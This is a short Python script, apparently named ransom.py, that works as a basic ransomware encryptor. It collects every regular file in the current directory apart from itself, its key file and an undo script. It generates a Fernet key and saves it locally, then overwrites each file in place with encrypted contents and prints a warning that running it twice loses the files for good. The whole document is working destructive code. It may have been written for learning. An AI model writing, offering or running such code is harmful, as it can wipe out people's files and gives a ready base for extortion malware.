#!/usr/bin/env python3
import os
from cryptography.fernet import Fernet

#Locate files

files = []

for file in os.listdir():
    if file == "ransom.py" or file == "thekey.key" or file == "ransom-undo.py": #ignore scripts and key for encrypting
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)

# Creating encryption key
key = Fernet.generate_key()

#write generated key into a file
with open("thekey.key", "wb") as thekey:
    thekey.write(key)

#use key variable to encrypt contents of files
for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)

print("All files are now encrypted. Don't run it again or they'll be gone for good.")